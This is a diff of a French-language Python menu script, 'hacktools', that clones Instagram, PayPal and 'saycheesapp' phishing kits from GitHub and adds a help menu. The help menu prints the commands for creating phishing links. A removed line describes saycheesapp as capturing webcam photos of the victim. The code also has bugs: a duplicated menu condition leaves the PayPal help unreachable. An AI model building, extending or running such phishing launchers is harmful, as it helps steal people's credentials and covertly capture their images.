@@ -10,10 +10,12 @@
 		juliedbac@gmail.com
 """
 #------------------------------------#
-#             VARIABLE               #
+#        VARIABLE & CONSTANTE        #
 #------------------------------------#
 username = "--"
 on_off = True
+
+printError="Désolé votre saisie est incorecte \n choisiser une option valide :"
 #
 #------------------------------------#
 
@@ -31,10 +33,15 @@ def println(number):
 		print("")
 		k += 1
 
-def printError():
-	print("Désolé votre saisie est incorecte \n choisiser une option valide :")
-	println(4)
 
+def conte_a_rebour(nombre, text=""):
+	os.system("clear")
+	while nombre > 0:
+		print(text)
+		print("\n\n\ntemps {}s".format(nombre))
+		sleep(1)
+		nombre-=1
+		os.system("clear")
 #------------------------------------#
 
 
@@ -55,11 +62,11 @@ while on_off:
 			username = ">>"
 
 		else :
-			printError()
+			conte_a_rebour(5, printError)
 #																				choix dune option entre instalation / utilisation / chager de nom / ou sortie de hacktools
 	else:
 		os.system("clear")
-		print("[*]Choisir une option :\n\n[1]installation des outils \n[2] \n[3]Changer de nom \n[4]sortie")
+		print("[*]Choisir une option :\n\n[1]installation des outils \n[2]Aide \n[3]Changer de nom \n[4]sortie")
 		userChoise = input("{}>".format(username))
 		userChoise = str(userChoise)#											choix d'une option instalation 
 		if userChoise == "1":#													menu userchoice
@@ -73,38 +80,56 @@ while on_off:
 				os.system("git clone https://github.com/thelinuxproject/paypal tools/paypal")#	installation de paypal
 				os.system("clear")
 				println(7)
-				print("operation terminer...\nCommandes pour utiliser instagram :\n	•cd tools/insatgram\n	•bash instagram.sh")
-				print("\nCommandes pour utiliser paypal :\n	•cd tools/paypal\n	•bash paypal.sh")
-				sleep(6)#														attente de 4seconde	
+				print("operation terminer...")
+				conte_a_rebour(4)#												attente de 4 seconde	
 			elif userChoise_tools == "2":#										choix n°1 pour istaller les outils de phishing
 				os.system("mkdir tools")
 				os.system("git clone https://github.com/thelinuxproject/saycheesapp tools/saycheesapp")#	installation de saycheesapp 
 				os.system("clear")
 				println(7)
-				print("operation terminer...\nsaycheesapp est une version phishing de instagrm (avec des photo de la webcam de votre victim)\n	Commandes pour l'utiliser :\n	•cd tools/saycheesapp\n	•bash saycheesapp.sh)
-				sleep(6)#
+				print("operation terminer...")
+				conte_a_rebour(4)#												attente de 4 seconde	
 			elif userChoise_tools == "4":#										choix n°4 pour quitter le choi de téléchargement des des depots
 				userChoise = "0"#												retour au menu userchoice
 			else :
-					os.system("clear")
-					printError()
+				conte_a_rebour(5, printError)
 
 		elif userChoise == "2":
 			os.system("clear")
-			print("[*]Choisir une option :\n\n[1]\n[2] \n[3] \n[4]sortie")
-			userChoise_ph = input("{}>".format(username))
-			userChoise_ph = str(userChoise_ph)#									cast de la variable userChoise_ph
-			#if userChoise_ph == "1":
-			if userChoise_ph == "4":#											choix n°4 pour quitter le chois de l'outis
+			print("[*]Aide pour :\n\n[1]phishing\n[2]saycheesapp \n[3] \n[4]sortie")
+			user_choise_help = input("{}>".format(username))
+			user_choise_help = str(user_choise_help)#								cast de la variable userChoise_ph
+			
+			if user_choise_help == "1":
+				os.system("clear")
+				print("[*]Aide pour :\n\n[1]instagram\n[2]paypal \n[3] \n[4]sortie")
+				user_choise_ph = input("{}>".format(username))
+				user_choise_ph = str(user_choise_ph)
+
+				if user_choise_ph == "1":
+					os.system("clear")
+					conte_a_rebour(10, "\nCommandes pour créer un lien de phisning instagram sont les suivante :\n\n\n	•cd tools/instagram\n\n	•bash instagram.sh")
+
+				elif user_choise_ph == "1":
+					os.system("clear")
+					conte_a_rebour(10, "\nCommandes pour créer un lien de phisning paypal sont les suivante :\n\n\n	•cd tools/paypal\n\n	•bash paypal.sh")
+
+				else :
+					conte_a_rebour(5, printError)
+
+			elif user_choise_help == "2":
+				os.system("clear")
+				conte_a_rebour(10, "\nCommandes pour créer un lien de phisning paypal sont les suivante :\n\n\n	•cd tools/saycheesapp\n\n	•bash saycheesapp.sh")
+
+			elif user_choise_help == "4":#										choix n°4 pour quitter le chois de l'outis
 				userChoise = "0"#												retour au menu userchoice
+			
 			else :
-				os.system("clear")#												netoyer le terminal
-				printError()
+				conte_a_rebour(5, printError)
 
 		elif userChoise == "3":
 			username = "--"#													retour au menu changer de nom
 		elif userChoise == "4":
 			on_off = 0#															sorti de hacktools
 		else :
-			os.system("clear")#													netoyer le terminal
-			printError()
+			conte_a_rebour(5, printError)
